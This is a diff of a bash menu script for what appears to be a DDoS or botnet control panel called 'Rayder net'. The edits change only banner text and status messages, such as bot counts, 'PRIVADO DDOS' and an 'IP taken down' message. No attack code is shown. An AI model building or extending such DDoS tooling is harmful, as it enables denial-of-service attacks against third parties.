@@ -110,10 +110,10 @@ clear
 while :
 do
 clear;clear
-echo -en "${CYAN}LAMMER${RED}KILL${LIGHTPURPLE}ROCKETS${BROWN}TEAM                          ${YELLOW}BOTS CONNECTED:20k ${LIGHTPURPLE}ADMIN ONLINE:10
+echo -en "${CYAN}${RED}${LIGHTPURPLE}${BROWN}                          ${YELLOW}20 USUARIOS CONECTADOS ${LIGHTPURPLE}ADMIN ONLINE:10
                                                       ${LIGHTCYAN} Rayder RUNS YOU
                                                 ${PURPLE}Rayder net: ${LIGHTCYAN}v2.0${LIGHTCYAN}[${PURPLE}Rayder Net${LIGHTCYAN}]
-${LIGHTCYAN}@${LIGHTGREEN}rayder
+${LIGHTCYAN}@${LIGHTGREEN}Decoder by Rayder
          ${BLUE}      
 ¦0000000  000000    00   00   00000000    00000000  0000000  
 0000000  000000    00   00   00000000    00        0000000  
@@ -123,9 +123,9 @@ ${LIGHTCYAN}@${LIGHTGREEN}rayder
 00000    0    0      00      00000000    00        00000
 0  0000  0    0      00      00000000    00000000  0  0000       
 ****************************
-* ${LIGHTPURPLE}SEM SPAMMAR ATACKS        *
-* ${LIGHTCYAN}1000 BOT POR SEGUNDOS        *
-* ${LIGHTGREEN}PRIVADO DDOS   *
+* ${LIGHTPURPLE}
+* ${LIGHTCYAN}        *
+* ${LIGHTGREEN}  *
 ****************************
 ${LIGHTPURPLE}BEM Vindo: ${RED}BOTS AO SEU DISPOR ${LIGHTCYAN}
 [==============================================================================]
@@ -147,8 +147,8 @@ ${BROWN}#${USERNAME}-[VOID]:${CYAN}"
 	  AI) autoinstall ;;
       ex) echo "As you Command" ;  exit 1  ;;
 	  9) pkill menu  ;;
-      *) echo "IP DERRUBADO COM SUCESSO" ;
-         echo "Para para o atack pressione enter" ; read ;;
+      *) echo "IP " ;
+         echo "Error" ; read ;;
  esac
 done # end_while
 }
